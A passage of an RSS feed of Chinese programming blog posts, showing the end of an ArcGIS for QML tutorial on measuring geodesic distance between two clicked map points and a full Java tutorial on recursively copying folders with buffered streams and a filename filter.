            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(clickNum == 2){&lt;span&gt;//&lt;/span&gt;&lt;span&gt;鼠标点击第二次 确定终点位置 并添加图形&lt;/span&gt;
&lt;span&gt;                console.log(clickNum)
                clickNum &lt;/span&gt;= 0&lt;span&gt;;
                dis_endPoint &lt;/span&gt;=&lt;span&gt; mouse.mapPoint
                &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; dis_end =&lt;span&gt; GeometryEngine.project(dis_endPoint,spatialReference.createWgs84())
                dis_endGraphic.geometry &lt;/span&gt;=&lt;span&gt; dis_end
                console.log(dis_endPoint)
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;创建路径线&lt;/span&gt;
                &lt;span&gt;var&lt;/span&gt; polylineBuilder = ArcGISRuntimeEnvironment.createObject(&quot;PolylineBuilder&quot;&lt;span&gt;, {spatialReference:SpatialReference.createWgs84()});
                polylineBuilder.addPoints([dis_startGraphic.geometry,dis_endGraphic.geometry])
                &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; polyline =&lt;span&gt; polylineBuilder.geometry;

                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;生成路径线&lt;/span&gt;
                &lt;span&gt;var&lt;/span&gt; maxSegmentLength = 1&lt;span&gt;;
                &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; unitOfMeasurement = ArcGISRuntimeEnvironment.createObject(&quot;LinearUnit&quot;&lt;span&gt;, {linearUnitId: Enums.LinearUnitIdKilometers});
                &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; curveType =&lt;span&gt; Enums.GeodeticCurveTypeGeodesic;
                &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; pathGeometry =&lt;span&gt; GeometryEngine.densifyGeodetic(polyline, maxSegmentLength, unitOfMeasurement, curveType);

                pathGraphic.geometry &lt;/span&gt;=&lt;span&gt; pathGeometry;
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;计算距离&lt;/span&gt;
                distanceText = GeometryEngine.lengthGeodetic(pathGeometry,unitOfMeasurement,curveType).toFixed(2&lt;span&gt;)
                console.log(&lt;/span&gt;&quot;polyline builded&quot;,distanceText + &quot;km&quot;&lt;span&gt;)
            }
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 关于如何在地图上点击添加自定义输入文本，简单实现了一个 ，在另一篇博文：&lt;span&gt;&lt;a href=&quot;https://www.cnblogs.com/suRimn/p/9849198.html&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;《&lt;/span&gt;&lt;/a&gt;&lt;strong&gt;&lt;span&gt;&lt;span&gt;&lt;a href=&quot;https://www.cnblogs.com/suRimn/p/9849198.html&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;ArcGIS for qml 添加自由文本》&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 26 Oct 2018 03:16:00 +0000</pubDate>
<dc:creator>狐狸家的鱼</dc:creator>
<og:description>源码：https://github.com/sueRimn/ArcGIS-for-qml-demos 实现求地图上两点之间距离功能 这个功能主要实现鼠标在地图上点击两点进行测距。 在ArcGIS fo</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/suRimn/p/9849195.html</dc:identifier>
</item>
<item>
<title>IO流-文件夹的拷贝 - earth腾飞</title>
<link>http://www.cnblogs.com/tfper/p/9855228.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/tfper/p/9855228.html</guid>
<description>&lt;h3 id=&quot;文件夹的拷贝操作&quot;&gt;文件夹的拷贝操作&lt;/h3&gt;
&lt;h4 id=&quot;要求&quot;&gt;要求：&lt;/h4&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;完成文件夹的拷贝，包括子目录的拷贝和所有文件的拷贝&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;分析&quot;&gt;分析：&lt;/h4&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;首先，得在目标目录下创建一个与源文件夹名称相同的文件夹&lt;/li&gt;
&lt;li&gt;遍历源文件夹中的所有文件对象，判断子文件是目录还是文件&lt;/li&gt;
&lt;li&gt;如果是目录，递归调用第一步的操作&lt;/li&gt;
&lt;li&gt;如果是文件，用缓冲流文件字节流完成对文件的复制
&lt;ul&gt;&lt;li&gt;创建源和目标File f = new File(&quot;路径&quot;);&lt;/li&gt;
&lt;li&gt;创建输入流和输出流对象,肯定得传上面的源和目标&lt;/li&gt;
&lt;li&gt;输入输出操作，输入操作得定义一个缓冲数组和定义一个返回读取长度的len&lt;/li&gt;
&lt;li&gt;关闭流&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;完成&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;代码：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
public class CopyAllFile {
    public static void main(String[] args) throws Exception {
        //1.创建源和目标
        File srcDir = new File(&quot;D:/资料/test&quot;); 
        File destDir = new File(&quot;D:/资料/test_copy&quot;);
        if(!destDir.exists()){
            destDir.mkdirs();
        }
        copy(srcDir,destDir);
    }
    public static void copy(File src,File dest) throws Exception{
            if(src.isDirectory()){
                //是目录，就在目标文件夹中创建与源文件夹相同名称的文件夹
                File destDir = new File(dest,src.getName());
                destDir.mkdir();
                //列举出所有的文件对象
                File[] fs = src.listFiles();
                //遍历所有的文件对象
                for (File file : fs) {
                    copy(file,destDir);
                }
            }else{
                File file1 =new File(dest,src.getName());
                copyFile(src,file1);
            }
    }
    public static void copyFile(File inputFile,File outputFile) throws Exception{
        BufferedInputStream in = new BufferedInputStream(new FileInputStream(inputFile));
        BufferedOutputStream out = new BufferedOutputStream(new FileOutputStream(outputFile));
        byte[] buffer = new byte[1024];
        int len = -1;
        while((len = in.read(buffer)) != -1){
            out.write(buffer, 0, len);
        }
        in.close();
        out.close();
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当然，也可以有这样的需求，比如，我只想复制.avi的视频文件，那么这时候就得有一个筛选器，java给我我们提供了：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;File[] fs = dir.listFiles(FilenameFilter的实例)
必须覆盖类中的accept方法   boolean accept(File dir,String name){}&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;File[] fs = srcDir.listFiles(new FilenameFilter(){
    @Override
    public boolean accept(File dir, String name){
        return new File(dir,name).isFile() &amp;amp;&amp;amp; name.endsWith(&quot;.java&quot;);
    }
});&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Fri, 26 Oct 2018 03:12:00 +0000</pubDate>
<dc:creator>earth腾飞</dc:creator>
<og:description>文件夹的拷贝操作 要求： 完成文件夹的拷贝，包括子目录的拷贝和所有文件的拷贝 分析： 首先，得在目标目录下创建一个与源文件夹名称相同的文件夹 遍历源文件夹中的所有文件对象，判断子文件是目录还是文件 如</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/tfper/p/9855228.html</dc:identifier>
</item>
</channel>
</rss>